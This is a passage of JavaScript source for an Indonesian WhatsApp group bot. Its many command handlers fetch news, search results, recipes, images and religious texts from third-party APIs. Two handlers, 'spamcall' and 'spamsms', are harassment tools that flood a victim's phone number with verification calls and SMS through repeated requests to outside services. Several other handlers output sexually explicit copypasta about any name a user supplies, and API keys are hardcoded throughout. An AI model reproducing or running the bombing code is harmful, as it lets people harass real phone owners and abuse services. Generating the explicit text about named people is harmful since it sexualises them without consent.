					        if (!isGroup) return reply(mess.only.group);
				  if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
         sticWait(from)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${query}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      dha.sendMessage(from, hasil, MessageType.text, { quoted: mek});
    })
			await limitAdd(sender)
break
case 'pastebin':
case 'Pastebin':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${query}`, {method: 'get'})
                   dha.sendMessage(from, `${anu.result}`, text, {quoted: meki})
                     await limitAdd(sender)
break

                        case 'katailham':  
                        case 'Katailham':  
                        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                     const kta =['Lebih baik mengerti sedikit daripada salah mengerti.',
'Hampir semua pria memang mampu bertahan menghadapi kesulitan. Namun, jika Anda ingin menguji karakter sejati pria, beri dia kekuasaan.',
'Bila tekad seseorang kuat dan teguh, Tuhan akan bergabung dalam usahanya.',
'Penderitaan adalah pelajaran.',
'Ilmu pengetahuan tanpa agama adalah pincang.',
'Hidup itu seperti sebuah sepeda, agar tetap seimbang kita harus tetap bergerak.',
'Perbedaan masa lalu, sekarang, dan masa depan tak lebih dari ilusi yang keras kepala.',
'Sebuah meja, sebuah kursi, semangkuk buah, dan sebuah biola; apa lagi yang dibutuhkan agar seseorang bisa merasa bahagia?',
'Belas kasihanlah terhadap sesama, bersikap keraslah terhadap diri sendiri.',
'Cara paling baik untuk menggerakkan diri Anda ialah memberi tugas kepada diri sendiri.',
'Kita tidak boleh kehilangan semangat. Semangat adalah stimulan terkuat untuk mencintai, berkreasi dan berkeinginan untuk hidup lebih lama.',
'Manusia akan bahagia selama ia memilih untuk bahagia.','Saya tidak berharap menjadi segalanya bagi setiap orang. Saya hanya ingin menjadi sesuatu untuk seseorang.',
'Apabila sempurna akal seseorang, maka sedikit perkataannya.','Bahagialah orang yang dapat menjadi tuan untuk dirinya, menjadi kusir untuk nafsunya dan menjadi kapten untuk bahtera hidupnya.',
'Sahabat yang jujur lebih besar harganya daripada harta benda yang diwarisi dari nenek moyang.','Yang paling melelahkan dalam hidup adalah menjadi orang yang tidak tulus.',
'Terbuka untuk Anda, begitulah Tuhan memberi kita jalan untuk berusaha. Jangan pernah berfikir jalan sudah tertutup.',
'Penundaan adalah kuburan dimana peluang dikuburkan.','Cinta bukan saling menatap mata, namun melihat ke arah yang sama bersama-sama.',
'Kita adalah apa yang kita kerjakan berulang kali. Dengan demikian, kecemerlangan bukan tindakan, tetapi kebiasaan.',
'Jangan pernah mencoba menjadikan putra atau putri Anda menjadi seperti Anda. Diri Anda hanya cukup satu saja.',
'Jika Anda bisa membuat orang lain tertawa, maka Anda akan mendapatkan semua cinta yang Anda inginkan.',
'Masalah akan datang cepat atau lambat. Jika masalah datang, sambut dengan sebaik mungkin. Semakin ramah Anda menyapanya, semakin cepat ia pergi.',
'Kita tak bisa melakukan apapun untuk mengubah masa lalu. Tapi apapun yang kita lakukan bisa mengubah masa depan.',
'Kesabaran adalah teman dari kebijaksanaan.','Orang-orang kreatif termotivasi oleh keinginan untuk maju, bukan oleh keinginan untuk mengalahkan orang lain.',
'Dimanapun engkau berada selalulah menjadi yang terbaik dan berikan yang terbaik dari yang bisa kita berikan.',
'Kebencian seperti halnya cinta, berkobar karena hal-hal kecil.',
'Anda tidak perlu harus berhasil pada kali pertama.',
'Satu jam yang intensif, jauh lebih baik dan menguntungkan daripada bertahun-tahun bermimpi dan merenung-renung.',
'Hal terbaik yang bisa Anda lakukan untuk orang lain bukanlah membagikan kekayaan Anda, tetapi membantu dia untuk memiliki kekayaannya sendiri.',
'Tidak ada jaminan keberhasilan, tetapi tidak berusaha adalah jaminan kegagalan.',
'Aku tidak tahu kunci sukses itu apa, tapi kunci menuju kegagalan adalah mencoba membuat semua orang senang.']
					const su = kta[Math.floor(Math.random() * kta.length)]
					dha.sendMessage(from, ''+su+'\n\n_-Ilham._', text, { quoted: mek })
					await limitAdd(sender)
break
case 'ingfo':  
case 'Ingfo':  
				    if (!isGroup) return reply(`GRUP ONLY`)
					if (!isGroupAdmins) return reply(`LU ADMIN??`)
					var value = body.slice(7)
					var group = await dha.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: `[ *INGFO TERBARU!!!* ]\nDARI : *${pushname}*\nINGFO : *${value}*`,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					dha.sendMessage(from, options, text, {quoted: mek})			
              await limitAdd(sender)
break
                        case 'film':
                        case 'Film':
                        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Doraemon`)
                    query = args.join(" ")
                        sticWait(from)
                        res = await axios.get(`https://api.zeks.me/api/film?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var teks = `* FILM *\n\n*Hasil Pencarian : ${query}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            teks += `*Title* : ${ttt[i].title}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(teks)
                    await limitAdd(sender)
break
                case 'happymod':
                case 'Happymod':
                sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
                        sticWait(from)
                        res = await axios.get(`https://api.zeks.me/api/happymod?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var teks = `* HAPPYMOD *\n\n*Hasil Pencarian : ${query}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            teks += `*Title* : ${ttt[i].title}\n*Rate*: ${ttt[i].rating}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(teks)
                    await limitAdd(sender)
break
case 'Googlesearch':
                case 'googlesearch':
                case 'ggs':
                case 'Ggs':
                sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        sticWait(from)
                        res = await axios.get(`https://velgrynd.herokuapp.com/api/google?query=${query}`)
                        ttt = res.data.result
                        var eks = `* GOGGLE SEARCH *\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            eks += `*Nama* : ${ttt[i].title}\n*Link*: ${ttt[i].link}\n*Deskripsi* : ${ttt[i].snippet}\n\n`
                        }
                        reply(eks)
                    await limitAdd(sender)
break
case 'carimasakan':
                case 'Carimasakan':
                sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        sticWait(from)
                        res = await fetchJson(`https://mnazria.herokuapp.com/api/resep-search?text=${query}`)
                        ttt = res.results
                        var tst = `* CARI MASAKAN *\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            tst += `*Nama* : ${ttt[i].title}\n*Kesusahan*: ${ttt[i].difficulty}\n*Kunci* : ${ttt[i].key}\n*Waktu*: ${ttt[i].times}\n*Porsi*: ${ttt[i].serving}\n*Image*: ${ttt[i].thumb}\n\n`
                        }
                        reply(tst.trim())  
                    await limitAdd(sender)
break
case 'tribunnews': // Update By KATASHI
case 'Tribunnews': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://api.zeks.xyz/api/tribunews?apikey=Iyungputra`, {method: 'get'})
					teks = ' \n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Time* : ${i.time}\n*Url* : ${i.url}\n*Tweet* : ${i.ket}\n\n \n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'liputan': // Update By KATASHI
case 'Liputan': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://api.zeks.xyz/api/liputan6?apikey=Iyungputra`, {method: 'get'})
					teks = '\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*Keterangan* : ${i.ket}\n*Category* : ${i.category}\n*Time* : ${i.time}\n\n\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'spamcall':
case 'Spamcall':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 8303030303030`)
                    nomor = args[0]
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    await axios.get(`https://id.jagreward.com/member/verify-mobile/${nomor}`)
                    reply("Success")
                    await limitAdd(sender)
break        
case 'genshin':
case 'Genshin':
					data = await fetchJson(`https://raw.githubusercontent.com/mamet8/GenshinImpact/main/genshinimpact.json`, {method: 'get'})
					teks = 'GENSHIN IMPACT\n'
					for (let x of data.mondstadt) {
						teks += `*Nama:* : ${x.title}\n*Intro* : ${x.intro}\n*Icon* : ${x.icon}\n*Dubing* : ${x.name}\n*Audio* : ${x.audio}\n\nGENSHIN IMPACT\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'foxnews': // Update By KATASHI
case 'Foxnews': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://api.zeks.xyz/api/foxnews?apikey=Iyungputra`, {method: 'get'})
					teks = ' \n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*Country* : ${i.country}\n*Time* : ${i.time}\n*Content* : ${i.content}\n\n \n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'alay':
case 'Alay':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					data = await fetchJson(`https://api.zeks.xyz/api/alaymaker?kata=${body.slice(6)}&apikey=Iyungputra`)
					reply(data.result)
					await limitAdd(sender)
break
case 'wangy':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq}    WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis    banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH   apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI.    ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah    YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              await limitAdd(sender)
break
case 'sherk':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `Usiaku 22 tahun. Aku sangat mencintai ${qq}, aku punya semua Figurine dan wallpapernya. Aku berdoa setiap malam dan berterima kasih atas segala hal yang telah ia berikan kepadaku. \"${qq} adalah cinta\" aku bilang \"${qq} adalah Tujuan Hidupku\". Temanku datang ke kamarku dan berkata \"HALU LU ANJING !!\". Aku tau dia cemburu atas kesetiaanku kepada ${qq}. Lalu kukatakan padanya \"BACOT NJING !!\". Temanku menampol kepalaku dan menyuruhku untuk tidur. Kepalaku sakit dan aku menangis. Aku rebahan di kasur yang dingin, lalu ada sesuatu yang hangat menyentuhku. Ternyata ${qq} datang ke dalam kamarku, Aku begitu senang bertemu ${qq}. Dia membisikan ke telingaku, \"Kamu adalah impianku\" Dengan tangannya dia meraih diriku. Aku melebarkan pantatku keatas demi ${qq}. Dia menusukan sesuatu kedalam Anggusku. begitu sakit, tapi kulakukan itu demi ${qq}. Aku ingin memberikan kepuasan kepada ${qq}. Dia meraum bagaikan singa, disaat dia melepaskan cintanya kedalam Anggusku. Temanku masuk kekamarku dan berkata \"....... Anjing\". ${qq} melihat temanku dan berkata \" Semua sudah berakhir\" Dengan menggunakan kemampuannya Stellar Restoration ${qq} pergi meninggalkan kamarku. \"${qq} itu cinta\" \"${qq} itu kehidupan\".`
              reply(awikwok)
              await limitAdd(sender)
break
case 'simp':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `Buruan, panggil gue SIMP, ato BAPERAN. ini MURNI PERASAAN GUE. Gue pengen genjot bareng ${qq}. Ini seriusan, suaranya yang imut, mukanya yang cantik, apalagi badannya yang aduhai ningkatin gairah gue buat genjot ${qq}. Setiap lapisan kulitnya pengen gue jilat. Saat gue mau crot, gue bakal moncrot sepenuh hati, bisa di perut, muka, badan, teteknya, sampai lubang burit pun bakal gue crot sampai puncak klimaks. Gue bakal meluk dia abis gue moncrot, lalu nanya gimana kabarnya, ngrasain enggas bareng saat telanjang. Dia bakal bilang kalau genjotan gue mantep dan nyatain perasaannya ke gue, bilang kalo dia cinta ama gue. Gue bakal bilang balik seberapa gue cinta ama dia, dan dia bakal kecup gue di pipi. Terus kita ganti pakaian dan ngabisin waktu nonton film, sambil pelukan ama makan hidangan favorit. Gue mau ${qq} jadi pacar, pasangan, istri, dan idup gue. Gue cinta dia dan ingin dia jadi bagian tubuh gue. Lo kira ini copypasta? Kagak cok. Gue ngetik tiap kata nyatain prasaan gue. Setiap kali elo nanya dia siapa, denger ini baik-baik : DIA ISTRI GUE. Gue sayang ${qq}, dan INI MURNI PIKIRAN DAN PERASAAN GUE.`
              reply(awikwok)
              await limitAdd(sender)
break
case 'nenen':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `NENEN NENEN KEPENGEN NENEN SAMA ${qq}. TETEK GEDE NAN KENCANG MILIK ${qq} MEMBUATKU KEPENGEN NENEN. DIBALUT PAKAIAN KETAT YANG ADUHAI CROOOOTOTOTOTOTOT ANJING SANGE GUA BANGSAT. ${qq}, PLIS DENGERIN BAIK BAIK. TOLONG BUKA BAJU SEBENTAR SAJA PLISSS TOLOOONG BANGET, BIARKAN MULUT KERINGKU BISA MENGECAP NENEN ${qq}. BIARKAN AKU MENGENYOT NENENMU ${qq}. AKU RELA NGASIH SESEMBAHAN APA AJA BERAPAPUN ITU DUIT YANG AKU BAKAR KHUSUS TERKHUSUS BUATMU. TAPI TOLOOOONG BANGET BUKA BAJUMU AKU MAU NENEN. NENEN NENEEEEN NENEN ${qq} WANGIIII`
              reply(awikwok)
              await limitAdd(sender)
break
case 'wangy2':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `GW BENAR-BENAR PENGEN JILAT KAKI *${qq}*,GW PENGEN BANGET MENJILAT SETIAP BAGIAN KAKINYA SAMPAI AIR LIUR GW BERCUCURAN KAYAK AIR KERINGAT LALU NGENTOD DENGAN NYA SETIAP HARI SAMPAI TUBUH KITA MATI RASA, YA TUHAN GW INGIN MEMBUAT ANAK ANAK DENGAN *${qq}* SEBANYAK SATU TIM SEPAK BOLA DAN MEMBUAT SATU TIM SEPAK BOLA LAINYA UNTUK MELAWAN ANAK-ANAK TIM SEPAK BOLA PERTAMA GW  YANG GW BUAT SAMA *${qq}* GW PENGEN MASUK KE SETIAP LUBANG TUBUHNYA, MAU ITU LUBANG HIDUNG LUBANG MATA MAUPUN LUBANG BOOL, KEMUDIAN GW AKAN MANUSIA YANG TIDAK BISA HIDUP KALO GW GA ENTOD SETIAP HARI.`
              reply(awikwok)
              await limitAdd(sender)
break
                case 'bts':
case 'Bts':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                sticWait(from)
                ya = await getBuffer(`https://api.dapuhy.ga/api/randomimage/batues?apikey=Pkjf7IBi2md7UAK`)
                dha.sendMessage(from, ya, image, {quoted: mek})
                await limitAdd(sender)
break    
case 'blackpink':
case 'Blackpink':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                sticWait(from)
                yo = await getBuffer(`https://api.dapuhy.ga/api/randomimage/blekpink?apikey=Pkjf7IBi2md7UAK`)
                dha.sendMessage(from, yo, image, {quoted: mek})
                await limitAdd(sender)
break    
                case 'groupinfo':
                case 'Groupinfo':
        if (!isGroup) return;
        ppUrl = await dha.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        dha.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\` Group Info \`\`\`\n*${unique[0]} > Name* : ${groupName}\n*${unique[0]} > Member* : ${groupMembers.length}\n*${unique[0]} > Admin* : ${groupAdmins.length}\n*${unique[0]} > Description* : \n${groupDesc}`,
        });
              await limitAdd(sender)
break;
        case 'closetime':  
        case 'Closetime':  
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !mek.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		 
        reply('AKSES WAKTU DIPROSES')   	
                dha.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'0000'
				} else if (args[1]=='jam') {var timer = args[0]+'0000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = mek.participant
				let close = {
				text: `* *     @${nomor.split('@s.whatsapp.net')[0]}\n * *    `,
				contextInfo: { mentionedJid: [nomor] }
				}
				dha.groupSettingChange (from, GroupSettingChange.messageSend, true);
				reply(close)
				}, timer)
              await limitAdd(sender)
break 
		     	case 'opentime':  
		case 'Opentime':  
		     	if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !mek.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		    
                reply('AKSES WAKTU DIPROSES')   
                dha.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'00000'
				} else if (args[1]=='jam') {var timer = args[0]+'00000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = mek.participant
				let open = {
				text: `* *     @${nomor.split('@s.whatsapp.net')[0]}\n **   `,
				contextInfo: { mentionedJid: [nomor] }
				}
				dha.groupSettingChange (from, GroupSettingChange.messageSend, false);
				reply(open)
				}, timer)
              await limitAdd(sender)
break  
				///NEW FITUR BY KATASHI
case 'gabut':
case 'Gabut':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://katashi-api.herokuapp.com/api/gabut?apikey=dhabot`)
					reply(data.result.activity)
					await limitAdd(sender)
break
case 'translate':
case 'Translate':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`kasih teks lah^_^!!\nJangan lupa , imi translatenya dari eng ke indo`)
                    query = args.join(" ")	
					data = await fetchJson(`https://katashi-api.herokuapp.com/api/translate?kata=${query}&apikey=dhabot`)
					reply(data.result)
					await limitAdd(sender)
break
case 'tiktok':
                   case 'tiktokdl':
                   case 'tiktoknowm':
if (!q) return reply('Linknya?')
var { TiktokDownloader } = require('./lib/tiktokdl')
sticWait(from)
res = await TiktokDownloader(`${q}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from, `${res.result.nowatermark}`)
await limitAdd(sender)
break
case 'cuacabandara': // Update By KATASHI
case 'Cuacabandara': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://katashi-api.herokuapp.com/api/infocuaca/bandara?apikey=dhabot`, {method: 'get'})
					teks = 'CUACA BANDARA\n'
					for (let i of data.result.daftar_bandara) {
						teks += `*Nama:* : ${i.nama_bandara}\n*Waktu:* ${i.waktu_pengamatan}\n*Arah Angin:* ${i.arah_angin}\n*Kecepatan:* ${i.kecepatan}\n*Jarak Pandang:* ${i.jarak_pandang}\n*Cuaca:* ${i.cuaca}\n*Suhu:* ${i.suhu}\n*Timbun:* ${i.titik_timbun}\n*Udara:* ${i.tekanan_udara}\n\nCUACA BANDARA\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'searchsurah': // Update By KATASHI
case 'surah': // Update By KATASHI
case 'Surah': // Update By KATASHI
case 'Searchsurah': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Link nya?`)
                    query = args.join(" ")	
                    sticWait(from)
					data = await fetchJson(`https://hardianto-chan.herokuapp.com/api/muslim/surah?query=${query}&apikey=hardianto`, {method: 'get'})
					teks = 'SEARCH SURAH\n'
					for (let i of data) {
						teks += `*Arab:* : ${i.arab}\n*Indonesia:* ${i.indo}\n*Latin:* ${i.latin}\n\nSEARCH SURAH\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'storyanime':
case 'storyanime':	
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
x = await getBuffer(`https://tyz-api.herokuapp.com/anime/storyanime`)
sticWait(from)
dha.sendMessage(from, x, video, {quoted: mek})
await limitAdd(sender)
break
case 'rscovid': // Update By KATASHI
case 'Rscovid': // Update By KATASHI
case 'Rumahsakit': // Update By KATASHI
case 'rskopit': // Update By KATASHI
case 'Rskopit': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
					data = await fetchJson(`https://dekontaminasi.com/api/id/covid19/hospitals`, {method: 'get'})
					teks = 'RS COVID\n'
					for (let i of data) {
						teks += `*Nama:* : ${i.name}\n*Lokasi:* ${i.address}\n*Kota:* ${i.region}\n*No Hp:* ${i.phone}\n*Provinsi:* ${i.province}\n\nRS COVID\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'provinci': // Update By KATASHI
case 'Provinci': // Update By KATASHI
case 'Provinsi': // Update By KATASHI
case 'provinsi': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://api-pesantren-indonesia.vercel.app/provinsi.json`, {method: 'get'})
					teks = 'PROVINSI\n'
					for (let i of data) {
						teks += `*Id:* : ${i.id}\n*Nama:* ${i.nama}\n\nPROVINSI\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'kab': // Update By KATASHI
case 'Kab': // Update By KATASHI
case 'kabupaten': // Update By KATASHI
case 'Kabupaten': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Idnya?\nId bisa di lihat di .provinsi`)
                    query = args.join(" ")	
					data = await fetchJson(`https://api-pesantren-indonesia.vercel.app/kabupaten/${query}.json`, {method: 'get'})
					teks = 'Kabupaten\n'
					for (let i of data) {
						teks += `*Id:* : ${i.id}\n*Nama:* ${i.nama}\n\nKABUPATEN\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'pesantren': // Update By KATASHI
case 'Pesantren': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Idnya?\nId bisa di lihat di .kabupaten`)
                    query = args.join(" ")	
					data = await fetchJson(`https://api-pesantren-indonesia.vercel.app/pesantren/${query}.json`, {method: 'get'})
					teks = 'PESANTREN\n'
					for (let i of data) {
						teks += `*Id:* : ${i.id}\n*Nama:* ${i.nama}\n*Nspp:* ${i.nspp}\n*Alamat:* ${i.alamat}\n\nPESANTREN\n`
					}
					reply(teks.trim())
					
					await limitAdd(sender)
break
case 'spamsms':
case 'Spamsms':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 8303030303030`)
                    nomor = args[0]
                    sticWait(from)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    reply("Success")
                    await limitAdd(sender)
break        
                    case 'jooxsearch':
case 'Jooxsearch':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} starboy`)
                    query = args[0]
                    sticWait(from)
                    get_result = await fetchJson(`https://viko-api.herokuapp.com/api/music/joox?apikey=katashi&query=${query}`)
                    i = get_result.result
                    ini_txt = `Lagu : ${i.lagu}\n`
                    ini_txt += `Album : ${i.album}\n`
                    ini_txt += `Penyanyi : ${i.panyanyi}\n`
                    ini_txt += `Tanggal : ${i.publish}\n`
                    ini_txt += `Lirik : ${i.lirik}\n`
                    gambar = await getBuffer(i.img)
                    dha.sendMessage(from, gambar, image, {quoted: mek, caption: ini_txt})
